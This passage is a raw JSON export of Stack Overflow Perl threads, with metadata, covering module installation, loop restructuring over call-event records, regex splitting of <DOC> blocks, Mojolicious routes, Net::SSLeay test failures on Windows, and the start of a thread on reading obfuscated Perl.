/System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\nBEGIN failed--compilation aborted at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\n&gt; \n</code></pre>\n\n<p>Based on <a href=\"https://stackoverflow.com/questions/65865/whats-the-easiest-way-to-install-a-missing-perl-module\">What&#39;s the easiest way to install a missing Perl module?</a> I did  </p>\n\n<pre><code>&gt; cpan IPC::Run\n&lt;snip&gt;\nAppending installation info to /Users/BNW/perl5/lib/perl5/darwin-thread-multi-2level/perllocal.pod\n  TODDR/IPC-Run-20180523.0.tar.gz\n  /usr/bin/make install  -- OK \n</code></pre>\n\n<p>And then rebooted this MacBook Pro 10.14.6. But I get apparently the same error:</p>\n\n<pre><code>&gt; bosswrap.pl\nCan't locate IPC/Run.pm in @INC (you may need to install the IPC::Run module) (@INC contains: /sw/lib/perl5/darwin-thread-multi-2level /sw/lib/perl5 /sw/lib/perl5/darwin /Library/Perl/5.18/darwin-thread-multi-2level /Library/Perl/5.18 /Network/Library/Perl/5.18/darwin-thread-multi-2level /Network/Library/Perl/5.18 /Library/Perl/Updates/5.18.4 /System/Library/Perl/5.18/darwin-thread-multi-2level /System/Library/Perl/5.18 /System/Library/Perl/Extras/5.18/darwin-thread-multi-2level /System/Library/Perl/Extras/5.18 .) at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\nBEGIN failed--compilation aborted at /Users/BNW/u/kh/bin/bosswrap.pl line 3.\n&gt; \n</code></pre>\n\n<p>How can I fix this?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1574524326, "post_id": 59008053, "comment_id": 104266835, "body": "<i>&quot;I&#39;m stuck with how to combine two next if in one loop, here I have used 2 loops to do the job ...&quot;</i> The second loop does not have a <code>next if</code>. Please clarify."}, {"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574537185, "post_id": 59008053, "comment_id": 104270554, "body": "sorry there was a missing like before gprscall if statement , <code>next if ( ! exists $calleventtag-&gt;[$_]-&gt;{&#39;gprsCall&#39;});</code>"}], "answers": [{"comments": [{"owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "edited": false, "score": 0, "creation_date": 1574543026, "post_id": 59009427, "comment_id": 104272086, "body": "brother its worked fine with me but currently im using the script on <code>sun solaris 10</code>and its return the below messages : <code>Use of uninitialized value in length at &#47;usr&#47;perl5&#47;5.8.4&#47;lib&#47;sun4-solaris-64int&#47;Convert&#47;ASN1&#47;_decode&zwnj;&#8203;.pm line 58.</code> and <code>Use of uninitialized value in concatenation (.) or string..</code>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "edited": false, "score": 1, "creation_date": 1574543500, "post_id": 59009427, "comment_id": 104272223, "body": "Neither <code>length</code>, concatenation/interpolation nor Convert::ASN1 is used in the code in my answer."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 3, "last_activity_date": 1574530346, "last_edit_date": 1574530346, "creation_date": 1574524588, "answer_id": 59009427, "question_id": 59008053, "link": "https://stackoverflow.com/questions/59008053/how-to-combine-two-next-if-together/59009427#59009427", "title": "how to combine two next if together", "body": "<pre><code>for (...) {\n   next if ...;\n\n   ...\n}\n</code></pre>\n\n<p>can also be written as</p>\n\n<pre><code>for (...) {\n   if (!...) {\n      ...\n   }\n}\n</code></pre>\n\n<p>You could use the following:</p>\n\n<pre><code>use Data::Diver qw( Dive );\n\nmy $call_event_details = Dive($struct, qw( transferBatch callEventDetails ));\n\nfor my $call_event_detail (@$call_event_details) {\n   next if !$call_event_detail-&gt;{supplServiceEvent};\n\n   if ( my $bci = Dive($call_event_detail, qw( mobileOriginatedCall basicCallInformation )) ) {\n      delete $bci-&gt;{destinationNetwork};\n\n      if ( my $scs = $bci-&gt;{simChargeableSubscriber} ) {\n         my $msisdc = $scs-&gt;{msisdn};\n         delete $scs-&gt;{msisdn} if $msisdc &amp;&amp; $msisdc !~ /^96279/;\n      }\n   }\n\n   if ( my $dest = Dive($call_event_detail, qw( gprsCall gprsBasicCallInformation gprsDestination )) ) {\n      delete $dest-&gt;{accessPointNameOI};\n   }\n}\n</code></pre>\n\n<p>Notes:</p>\n\n<ul>\n<li>The quotes around string literals aren't needed in hash indexes if the string is valid valid identifier. For example, <code>$hash-&gt;{'foo'}</code> can be written as <code>$hash-&gt;{foo}</code>.</li>\n<li><code>-&gt;</code> isn't needed between two indexes. For example, <code>$hash-&gt;{foo}-&gt;{bar}</code> can be written as <code>$hash-&gt;{foo}{bar}</code>.</li>\n<li>If a hash element is either a reference or doesn't exist, you don't need to use <code>exists</code> to check if you have a reference; you can use a simple truth test since references are always true.</li>\n<li><p>[BUG FIX] <code>$hash-&gt;{foo}{bar}</code> can autovivify <code>$hash-&gt;{foo}</code> (cause a reference to be assigned to it), so your tests to check if stuff exists could actually be causing things to be created. To fix this, you can replace</p>\n\n<pre><code>if ($hash-&gt;{foo}{bar})\n</code></pre>\n\n<p>with</p>\n\n<pre><code>if ($hash-&gt;{foo} &amp;&amp; $hash-&gt;{foo}{bar})\n</code></pre>\n\n<p>or</p>\n\n<pre><code>if (Dive($hash, qw( foo bar )))\n</code></pre></li>\n<li><p>Using the same long chain of indexes (<code>-&gt;{foo}{bar}{baz}</code>) repeatedly is error prone.</p></li>\n<li>It's best to use plural names for arrays. First, it's more descriptive, but it also makes choosing names for loop variables easier.</li>\n<li>Speaking of variable names, why would use <code>$calleventtag</code> for the name of the variable containing <code>callEventDetails</code> nodes?</li>\n<li>You don't need to check if a hash element exists before trying to delete it; <code>delete</code> can be passed an element that doesn't exist.</li>\n<li>No need to loop over the indexes of an array if you don't need the indexes.</li>\n<li><code>grep</code> was a good choice, but <code>splice</code> was not. You should have used: <code>$calleventtag = [ grep { ... } @$calleventtag ];</code>. I moved the check into the loop.</li>\n</ul>\n"}], "owner": {"reputation": 158, "user_id": 10921226, "user_type": "registered", "profile_image": "https://graph.facebook.com/2994599317232807/picture?type=large", "display_name": "Nikolan Asad", "link": "https://stackoverflow.com/users/10921226/nikolan-asad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 59009427, "answer_count": 1, "score": 2, "last_activity_date": 1574537345, "creation_date": 1574515004, "last_edit_date": 1574537345, "question_id": 59008053, "link": "https://stackoverflow.com/questions/59008053/how-to-combine-two-next-if-together", "title": "how to combine two next if together", "body": "<p>I have a script that run on the list of files to do some of the changes, each file of them has a call event and the call event details contains 4 elements so i just want to do the changes on 2 of them only here I'm stuck with how to combine two <code>next if</code> in one loop, here I have used 2 loops to do the job but it takes more time , is there any idea about how to do that ? </p>\n\n<pre><code>my $calleventtag = $struct-&gt;{'transferBatch'}-&gt;{'callEventDetails'};\nmy @indexes = reverse (grep { exists $calleventtag-&gt;[$_]-&gt;{'supplServiceEvent'} } 0..$#$calleventtag);\n\n    my $sup_event_cnt = $#indexes;\n\n    foreach my $index (@indexes)\n    {\n    splice (@$calleventtag , $index,1);\n    }\nforeach (0..$#$calleventtag)\n    {\n    next if ( ! exists $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}) ;\n\n        if ( exists $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}-&gt;{'basicCallInformation'}-&gt;{'destinationNetwork'} )\n        {\n            delete $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}-&gt;{'basicCallInformation'}-&gt;{'destinationNetwork'};\n        }\n\n        if ( exists $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}-&gt;{'basicCallInformation'}-&gt;{'chargeableSubscriber'}-&gt;{'simChargeableSubscriber'}-&gt;{'msisdn'} \n        &amp;&amp; $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}-&gt;{'basicCallInformation'}-&gt;{'chargeableSubscriber'}-&gt;{'simChargeableSubscriber'}-&gt;{'msisdn'} !~ m/^96279/ \n        )\n        {\n            delete $calleventtag-&gt;[$_]-&gt;{'mobileOriginatedCall'}-&gt;{'basicCallInformation'}-&gt;{'chargeableSubscriber'}-&gt;{'simChargeableSubscriber'}-&gt;{'msisdn'};\n        }\n\n    }\nforeach (0..$#$calleventtag)\n    {\nnext if ( ! exists $calleventtag-&gt;[$_]-&gt;{'gprsCall'});\n\n    if ( exists $calleventtag-&gt;[$_]-&gt;{'gprsCall'}-&gt;{'gprsBasicCallInformation'}-&gt;{'gprsDestination'}-&gt;{'accessPointNameOI'} )\n            {\n                delete $calleventtag-&gt;[$_]-&gt;{'gprsCall'}-&gt;{'gprsBasicCallInformation'}-&gt;{'gprsDestination'}-&gt;{'accessPointNameOI'};\n            }\n    }\n</code></pre>\n"}, {"tags": ["perl", "lucene"], "answers": [{"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 1, "last_activity_date": 1574491714, "creation_date": 1574491714, "answer_id": 59005264, "question_id": 59005005, "link": "https://stackoverflow.com/questions/59005005/how-to-split-two-html-tag-on-one-file-into-separated-lucene-document/59005264#59005264", "title": "How to split two html tag on one file into separated lucene document?", "body": "<p>Ok, what is <strong>lucene document</strong>? </p>\n\n<p>Please see the following code, I extract data into two arrays - one with <code>&lt;DOC&gt;&lt;/DOC&gt;</code> and other without it included.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy $data = do { local $/; &lt;DATA&gt; };\n\n$data =~ s/\\n//g;\n\nmy @blocks1 = ( $data =~ m!(&lt;DOC&gt;.*?&lt;/DOC&gt;)!g );\nmy @blocks2 = ( $data =~ m!&lt;DOC&gt;(.*?)&lt;/DOC&gt;!g );\n\nprint Dumper(\\@blocks1);\nprint Dumper(\\@blocks2);\n\n__DATA__\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-111 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-112 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title on D1-112 &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content on D1-112\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 4234, "user_id": 12313309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3fPDo.jpg?s=128&g=1", "display_name": "Polar Bear", "link": "https://stackoverflow.com/users/12313309/polar-bear"}, "is_accepted": false, "score": 0, "last_activity_date": 1574492305, "creation_date": 1574492305, "answer_id": 59005322, "question_id": 59005005, "link": "https://stackoverflow.com/questions/59005005/how-to-split-two-html-tag-on-one-file-into-separated-lucene-document/59005322#59005322", "title": "How to split two html tag on one file into separated lucene document?", "body": "<p>In case if you would like to preserve <em>newline</em> in blocks then code will be following</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse Data::Dumper;\n\nmy $data = do { local $/; &lt;DATA&gt; };\n\nmy @blocks1 = ( $data =~ m!(&lt;DOC&gt;.*?&lt;/DOC&gt;)!sg );\nmy @blocks2 = ( $data =~ m!&lt;DOC&gt;(.*?)&lt;/DOC&gt;!sg );\n\nprint Dumper(\\@blocks1);\nprint Dumper(\\@blocks2);\n\n__DATA__\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-111 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-112 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title on D1-112 &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content on D1-112\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "is_accepted": false, "score": 1, "last_activity_date": 1574676498, "creation_date": 1574676498, "answer_id": 59029399, "question_id": 59005005, "link": "https://stackoverflow.com/questions/59005005/how-to-split-two-html-tag-on-one-file-into-separated-lucene-document/59029399#59029399", "title": "How to split two html tag on one file into separated lucene document?", "body": "<p>Just try this:</p>\n\n<pre><code>my $str ='&lt;DOC&gt;\n&lt;DOCID&gt; D1-111 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-112 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title on D1-112 &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content on D1-112\n&lt;/TEXT&gt;\n&lt;/DOC&gt;';\n\nmy $fcnt = 1; \nwhile($str=~m/&lt;DOC[^&gt;]*&gt;((?:(?!&lt;\\/DOC&gt;).)*)&lt;\\/DOC&gt;/gs)\n{\n    my $docf = $&amp;; my $filename = \"Lucena\\_$fcnt\\.txt\";\n    writeFile($filename, $docf); $fcnt++;\n}\n\nsub writeFile\n{\n    my ($file, $cnt) = @_;\n\n    open(FILE, \"&gt;\", $file) || die \"Couldn't write the file: $!\\n\";\n    print FILE $cnt;\n    close(FILE);\n\n}\n</code></pre>\n"}], "owner": {"reputation": 67, "user_id": 11888510, "user_type": "registered", "profile_image": "https://graph.facebook.com/2325388120909072/picture?type=large", "display_name": "Fairuz Yassar", "link": "https://stackoverflow.com/users/11888510/fairuz-yassar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 39, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1574676498, "creation_date": 1574489032, "question_id": 59005005, "link": "https://stackoverflow.com/questions/59005005/how-to-split-two-html-tag-on-one-file-into-separated-lucene-document", "title": "How to split two html tag on one file into separated lucene document?", "body": "<p>I have html data like this :</p>\n\n<pre><code>&lt;DOC&gt;\n&lt;DOCID&gt; D1-111 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n&lt;DOC&gt;\n&lt;DOCID&gt; D1-112 &lt;/DOCID&gt;\n&lt;TITLE&gt; this is title on D1-112 &lt;/TITLE&gt;\n&lt;TEXT&gt;\nThis is content on D1-112\n&lt;/TEXT&gt;\n&lt;/DOC&gt;\n</code></pre>\n\n<p>how to create each content inside <code>&lt;DOC&gt;&lt;/DOC&gt;</code> is one lucene document so based on html data i have 2 lucene document ?</p>\n"}, {"tags": ["perl", "mojolicious"], "comments": [{"owner": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "edited": false, "score": 0, "creation_date": 1574466603, "post_id": 59001818, "comment_id": 104256670, "body": "Seems like maybe chaining to another stack with under() might work?"}], "answers": [{"tags": [], "owner": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "is_accepted": true, "score": 1, "last_activity_date": 1574701401, "creation_date": 1574701401, "answer_id": 59036769, "question_id": 59001818, "link": "https://stackoverflow.com/questions/59001818/how-to-call-a-mojolicious-controller-method-after-failing-on-template/59036769#59036769", "title": "How to call a Mojolicious controller method after failing on template", "body": "<p>I'm not sure if this is the intended use case for <a href=\"https://mojolicious.org/perldoc/Mojolicious/Guides/Routing#Under\" rel=\"nofollow noreferrer\">under()</a>, but it seems to be a decent solution to my problem.</p>\n\n<pre><code>$r-&gt;under( '/:controller/:action', sub { !shift-&gt;render_maybe } )-&gt;get('/');\n$r-&gt;post('/:controller/:action');\n</code></pre>\n\n<p>Chaining under()->get() will create a nested route. The first in the stack will render a template, if it exists, from the render_maybe, stopping there. If the template doesn't exist, it will go to the standard get(), which will first check for a controller action. This is exactly what I was wanting.</p>\n"}], "owner": {"reputation": 373, "user_id": 8845620, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0082695b3d26ff97841bb1e65862a0a?s=128&d=identicon&r=PG&f=1", "display_name": "UncleCarl", "link": "https://stackoverflow.com/users/8845620/unclecarl"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 127, "favorite_count": 0, "accepted_answer_id": 59036769, "answer_count": 1, "score": 1, "last_activity_date": 1574701401, "creation_date": 1574457115, "question_id": 59001818, "link": "https://stackoverflow.com/questions/59001818/how-to-call-a-mojolicious-controller-method-after-failing-on-template", "title": "How to call a Mojolicious controller method after failing on template", "body": "<p>I have a Mojolicious problem that I suspect has an easy solution, but I can't swim through all of its code.</p>\n\n<pre><code>$r-&gt;get(\n    '/:controller/:action',\n    sub {\n        my $c = shift;\n        $c-&gt;render_maybe &amp;&amp; return;\n\n       # No template. Either call controller-&gt;action() or dispatch as POST\n    }\n);\n$r-&gt;post('/:controller/:action');\n</code></pre>\n\n<p>As you can see, I have two routes that use the same URL, one for GET and one for POST. The POST is straightforward. It renders after finding the controller and action method and isn't concerned with a template. I have the GET method working where a template exists, ignoring the controller, by using a callback with render_maybe(). My issue is, if there isn't a template, I want to go ahead and run the controller's method.</p>\n\n<p>One solution would be to simply identify my controller and call the action. Since I'm using placeholders in my route, I can't simply hard code this. So, is there a Mojolicious way of getting my controller class, or actual code that will get the class and call the method? I have both controller and action defined in stash, so this really shouldn't be a big deal. Mojo knows how to do this internally.</p>\n\n<p>Another option would be to convert this to a POST method and run it as normal. I don't know if it's best to either come up with the URL, or find the defined POST route, or just convert my GET to a POST. I'm not sure how to accomplish any of these.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["perl", "compilation", "openssl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574451044, "post_id": 59000059, "comment_id": 104251499, "body": "It might well be that the failed test is not critical for the usage of the module. So you could try skip the tests and see if the module still works first?"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1574451359, "post_id": 59000059, "comment_id": 104251645, "body": "You could also try report the issue on <a href=\"https://github.com/radiator-software/p5-net-ssleay/issues\" rel=\"nofollow noreferrer\">the issue tracker</a>"}, {"owner": {"reputation": 129, "user_id": 1370804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/065a3da00e0f4f59ff7ec73840437810?s=128&d=identicon&r=PG", "display_name": "DylanStreb", "link": "https://stackoverflow.com/users/1370804/dylanstreb"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 1, "creation_date": 1574451465, "post_id": 59000059, "comment_id": 104251699, "body": "Skipping the test does allow the perl module to be installed. I&#39;m not quite at the point where I can fully test it, as there&#39;s other Perl modules failing. My concern is that if I ignore this failure I&#39;ll end up with a hard-to-diagnose intermittent error much later on."}], "owner": {"reputation": 129, "user_id": 1370804, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/065a3da00e0f4f59ff7ec73840437810?s=128&d=identicon&r=PG", "display_name": "DylanStreb", "link": "https://stackoverflow.com/users/1370804/dylanstreb"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 46, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1574448400, "creation_date": 1574448400, "question_id": 59000059, "link": "https://stackoverflow.com/questions/59000059/netssleay-failing-applink-tests-with-openssl", "title": "Net::SSLeay failing Applink tests with openssl", "body": "<p>I'm trying to compile Perl, OpenSSL, and NET::SSLeay from scratch. This is on Windows, using Visual Studio 2017 (not cygwin or mingw), Windows 10, compiling 32 bit Perl (v5.30.1), OpenSSL (1.1.1d), Net::SSLeay (1.88).</p>\n\n<p>The compilation succeeds but one test for NET::SSLeay fails:</p>\n\n<blockquote>\n  <p>t\\local\\39_pkcs12.t .................... OPENSSL_Uplink(6CF30350,08):<br>\n  no OPENSSL_Applink t\\local\\39_pkcs12.t .................... Dubious,<br>\n  test returned 1 (wstat 256, 0x100) Failed 19/19 subtests  </p>\n</blockquote>\n\n<p>All other tests pass (external tests are disabled). OpenSSL's self tests pass. This appears to be a known issue with Net::SSLeay and has a mention in README.Win32, but with pre-compiled binaries. The recommended fix is to compile OpenSSL yourself, which is what I'm already doing.</p>\n\n<p>It looks like the applink is controlled by the compiler directive -D\"OPENSSL_USE_APPLINK\", which is already being supplied. This is from the basic Configure, and not something I added. The define is being supplied to every call of cl and it is being used during compilation. However, when I check for it through Net::SSLeay, it's missing:</p>\n\n<blockquote>\n  <p>perl -M\"Net::SSLeay\" -e \"print Net::SSLeay::SSLeay_version(1);\"<br>\n  compiler: cl /Zi /Fdossl_static.pdb /Gs0 /GF /Gy /MD /W3 /wd4090 /nologo /O2 /WX -DL_ENDIAN -DOPENSSL_PIC -DOPENSSL_CPUID_OBJ -DOPENSSL_BN_ASM_PART_WORDS -DOPENSSL_IA32_SSE2 -DOPENSSL_BN_ASM_MONT -DOPENSSL_BN_ASM_GF2m -DSHA1_ASM -DSHA256_ASM -DSHA512_ASM -DRC4_ASM -DMD5_ASM -DRMD160_ASM -DVPAES_ASM -DWHIRLPOOL_ASM -DGHASH_ASM -DECP_NISTZ256_ASM -DPOLY1305_ASM</p>\n</blockquote>\n\n<p>Most of those are what is used but -DOPENSSL_USE_APPLINK is notably missing. I do see it mentioned in the documentation for Net::SSLeay for SSLeay_version: \"SSLEAY_CFLAGS   - e.g. 'compiler: gcc -D_WINDLL -DOPENSSL_USE_APPLINK .....'\". So it looks like that define should be present and is somehow getting lost either after the compilation or during Net::SSLeay's compilation. </p>\n\n<p>Is there a way to resolve this issue and make the Net::SSLeay tests pass?</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 43, "user_id": 12416629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ffb49e8e7130761383d66499a4023a?s=128&d=identicon&r=PG&f=1", "display_name": "hugo", "link": "https://stackoverflow.com/users/12416629/hugo"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 0, "creation_date": 1574433923, "post_id": 58996381, "comment_id": 104243395, "body": "Thanks, that explains a lot, but not enough for me to decipher the regexp."}, {"owner": {"reputation": 8273, "user_id": 1334695, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/431ae6e9f7610b9d6a6a6cdebd0244d5?s=128&d=identicon&r=PG", "display_name": "stevieb", "link": "https://stackoverflow.com/users/1334695/stevieb"}, "reply_to_user": {"reputation": 45481, "user_id": 197758, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/628da6ba2a6c70e35c009b7e3c3a430a?s=128&d=identicon&r=PG", "display_name": "toolic", "link": "https://stackoverflow.com/users/197758/toolic"}, "edited": false, "score": 1, "creation_date": 1574434903, "post_id": 58996381, "comment_id": 104243985, "body": "To further what @toolic said, it&#39;s actually the <code>-M</code> (ie. use Module) directive, which means <code>use re;</code>. The <code>=eval</code> puts the <code>re</code> module into its <code>eval</code> mode. If in a script, it would look something like <code>use re qw(eval);</code>. Regarding the regex, obfu like this is designed to be looked at, not worked out ;)"}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 2, "creation_date": 1574435192, "post_id": 58996381, "comment_id": 104244166, "body": "Relevant Perlmonk post: <a href=\"https://www.perlmonks.org/?node_id=967004\" rel=\"nofollow noreferrer\">The History of Acme::Bleach and Acme::EyeDrops</a>, and FYI, the module <a href=\"https://metacpan.org/pod/Acme::EyeDrops\" rel=\"nofollow noreferrer\">Acme::EyeDrops</a> generates the same kind of codes you are looking at."}, {"owner": {"reputation": 43, "user_id": 12416629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ffb49e8e7130761383d66499a4023a?s=128&d=identicon&r=PG&f=1", "display_name": "hugo", "link": "https://stackoverflow.com/users/12416629/hugo"}, "edited": false, "score": 0, "creation_date": 1574436191, "post_id": 58996381, "comment_id": 104244704, "body": "Thanks, very funny and cool! This starts making sense. How can I convert it back? I haven&#39;t found anything on the EyeDrops page. Is there a debugger feature that can show me the &quot;real* code? Sorry, I rarely use perl."}, {"owner": {"reputation": 27648, "user_id": 9952196, "user_type": "registered", "profile_image": "https://graph.facebook.com/10216835866235879/picture?type=large", "display_name": "Shawn", "link": "https://stackoverflow.com/users/9952196/shawn"}, "edited": false, "score": 0, "creation_date": 1574441792, "post_id": 58996381, "comment_id": 104247539, "body": "<code>perltidy</code> is a useful perl pretty-printer and formatter."}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 12416629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ffb49e8e7130761383d66499a4023a?s=128&d=identicon&r=PG&f=1", "display_name": "hugo", "link": "https://stackoverflow.com/users/12416629/hugo"}, "edited": false, "score": 0, "creation_date": 1574437473, "post_id": 58997332, "comment_id": 104245315, "body": "Thank you for your complete and detailed answer! The assignment to a variable is a very simple and elegant solution. I did it with -MO=Deparse after some more googling."}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "reply_to_user": {"reputation": 43, "user_id": 12416629, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5ffb49e8e7130761383d66499a4023a?s=128&d=identicon&r=PG&f=1", "display_name": "hugo", "link": "https://stackoverflow.com/users/12416629/hugo"}, "edited": false, "score": 0, "creation_date": 1574437784, "post_id": 58997332, "comment_id": 104245463, "body": "I was playing around with B::Deparse as well; added a paragraph about that to my answer ;) (which you won&#39;t need, but future readers might)"}], "tags": [], "owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "is_accepted": true, "score": 6, "last_activity_date": 1574437705, "last_edit_date": 1574437705, "creation_date": 1574436690, "answer_id": 58997332, "question_id": 